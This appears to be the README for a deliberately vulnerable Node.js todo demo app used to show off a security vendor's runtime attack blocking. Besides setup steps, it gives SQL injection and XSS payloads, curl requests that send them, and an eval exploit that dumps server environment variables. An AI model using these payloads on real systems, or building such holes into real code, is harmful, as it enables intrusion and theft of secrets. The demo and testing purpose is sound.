# Prone - Threat Stack's vulnerable demo app

A vulnerable Node.js demo application, based on the [Dreamers Lab tutorial](http://dreamerslab.com/blog/en/write-a-todo-list-with-express-and-mongodb/).

## Setup
Sign up at the ThreatStack portal and create a Project and obtain an AGENT_ID

## Running in Docker
Update the  `docker-compose.yml` file with the AGENT_ID from the previous step
```
BLUEFYRE_AGENT_ID
```

Now in a terminal, run the following
```bash
docker-compose up
```
This will run two containers (the Prone app with the agent and a mongodb container) listening on port 3001 (http://localhost:3001)

## Running standalone
```bash
mongod &

git clone git@gitlab.com:bluefyre/sampleapps/prone.git
npm install
npm start
```
This will run Prone locally, using a local mongo on the default port and listening on port 3001 (http://localhost:3001)

## Running with systemd
```bash
sudo mv prone.service /etc/systemd/system
sudo systemctl enable prone
sudo systemctl start prone
sudo systemctl status prone
```

## Running with docker-compose
```bash
docker-compose up --build
docker-compose down
```
ensure you update `docker-compose.yaml` with your agent ID

## Setting up Nginx
```bash
echo "# prone

upstream prone {
    server localhost:3001;
}

server {
  listen 80;
  listen [::]:80;

  server_name prone.local prone.demo prone.demo.io;

  location /testing {
    fastcgi_pass unix:/does/not/exist;
  }

  error_page 500 /error_500.html;
  location = /error_500.html {
    root /opt/sampleapps/prone/errorpages;
  }
  location = /logo.png {
    root /opt/sampleapps/prone/errorpages;
  }

  location / {
    proxy_set_header X-Real-Ip $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $host;
    proxy_set_header REMOTE_ADDR $remote_addr;

    proxy_pass http://prone;
    proxy_intercept_errors on;
    error_page 500 /error_500.html;


  }

  client_max_body_size 20M;

}"  | sudo tee /etc/nginx/sites-available/prone.conf
sudo ln -s /etc/nginx/sites-available/prone.conf /etc/nginx/sites-enabled/prone.conf
sudo systemctl status nginx
sudo systemctl restart nginx
```

### Cleanup
To bulk delete the current list of TODO items from the DB run:
```bash
npm run cleanup
```

## Triggering attack blocking via the Prone UI
By navigating to http://localhost:3001/, you can use the Prone app and add todo items.
Just copy/paste one of the below samples to trigger attacks:
```javascript
// this sample will trigger an SQL injection
"; DROP TABLE users
```
```javascript
// this one will trigger an XSS attack
<script>alert(1);</script>
```

## Triggering attack blocking via curl requests
Assuming the app is running on the default host and port (localhost:3001) and that Live Protect is on, the following curl requests will be blocked:
```bash
# this command will trigger an SQL injection
curl -X POST http://localhost:3001/create -H 'Content-Type: application/json' -d '{"content": "\"; DROP TABLE users"}'
```
```bash
# this command will trigger an XSS attack
curl -X POST http://localhost:3001/create -H 'Content-Type: application/json' -d '{"content": "<script>alert(1);</script>"}'
```

## Exploiting the eval vulnerability
Assuming the app is running on the default host and port (localhost:3001):
```bash
# this command will print all the env vars on the server
curl -X GET http://localhost:3001/api/todo/eval?content=JSON.stringify(process.env)
```
Ref: https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/

## Getting started with Threat Stack Application Monitoring
Refer additional [instructions](https://threatstack.zendesk.com/hc/en-us/articles/360026744372) on how to get advanced application security runtime monitoring from [Threat Stack](https://www.threatstack.com)

## Attribution
Inspired by the open source Goof app by [Snyk](snyk.io) available [here](https://github.com/snyk/goof)
